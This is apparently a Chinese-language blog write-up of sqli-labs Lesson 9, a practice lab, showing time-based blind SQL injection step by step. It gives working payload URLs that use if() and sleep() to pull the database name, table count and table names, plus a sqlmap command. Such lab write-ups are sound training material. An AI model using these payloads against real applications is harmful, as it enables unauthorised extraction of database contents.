---
title: sqli-labs-lession 9 GET单引号基于时间盲注
date: 2018-09-26 18:57:13
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs-lession 9 GET单引号基于时间盲注 #
---

## 登录界面 ##

![1](/img/sql/Lesson-9/1.png)

## 手注 ##

### 时间盲注函数 ###

* sleep()函数
	
	sleep(n):静止n秒,n是个变量

* if(1,2,3)

	如果1为真,执行2,否则执行3

### 判断类型 ###

在这个页面的`?id=1`后写入任何数据都没有结果返回,永远都是`You are in...........`的界面。

利用if函数来判断类型。

先查看源码

![2](/img/sql/Lesson-9/2.png)

`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

注意到源码是单引号闭合的。并且无论数据库语句执行成功失败都不会返回信息。

可是如果我传入一个用if函数构造的语句

`1' and if(1,sleep(60),null)#`

SQL语句会变成

`$sql="SELECT * FROM users WHERE id='1' and if(1,sleep(60),null) #' LIMIT 0,1";`

如果被数据库成功解析,就会执行`sleep(60)`,页面就会转60s,即证明$id
被一个`''`包起来。

测试一下。

![3](/img/sql/Lesson-9/3.png)

可以发现左上角一直在转,果然是单引号闭合的时间盲注。

### 获取数据库 ####

#### 获取数据库长度 ####

![4](/img/sql/Lesson-9/4.png)

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(8=(length(database())),sleep(60),null)%23`

#### 获取数据库名 ####

猜第一个字符

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('s'=left(database(),1),sleep(60),null)%23`

![5](/img/sql/Lesson-9/5.png)

猜第二个

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('se'=left(database(),2),sleep(60),null)%23`

![6](/img/sql/Lesson-9/6.png)

中间省略了,可以用其他的方式,推荐二分法

最后猜解出数据库名

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('security'=left(database(),8),sleep(60),null)%23`

![7](/img/sql/Lesson-9/7.png)

数据库名为`security`

### 获取表 ###

#### 表数目 ####

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(4=(select count(table_name) from information_schema.tables where table_schema='security'),sleep(60),null)%23`

![8](/img/sql/Lesson-9/8.png)

#### 表长度 ####

以获取第一张表为例(第一张表是emails,玩旧了都记住了):

又在一直转了,说明第一张表长度为6。

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(6=length((select table_name from information_schema.tables where table_schema='security' limit 0,1)),sleep(60),null)%23`

![9](/img/sql/Lesson-9/9.png)

#### 表名 ####

这里过一遍二分法吧,免得忘了。一般从ascii码95~123。

True表示页面加载,False表示不加载。用第4张表(其实我知道是users表)测试。

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(95<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`

95:True

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(109<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`

109:True

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(116<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`

116:True

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(120<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`

120:False

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(118<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`

118:False

`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(117=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`

117:True

117的ascii码为`u`,第4张表的第一个字符为`u`。

剩下的过程就不写了。都是相同的原里,把要查询的东西填到`if(1,2,3)`的1中就行了。

## SQLMAP ##

`sqlmap -u 10.60.250.151/sqlilabs/Less-9/?id=1 --technique T --dbs`

--technique T:表示测试时间延迟注入、

这种方式需要大量的时间

![10](/img/sql/Lesson-9/10.png)

![11](/img/sql/Lesson-9/11.png)

剩下的就不表了。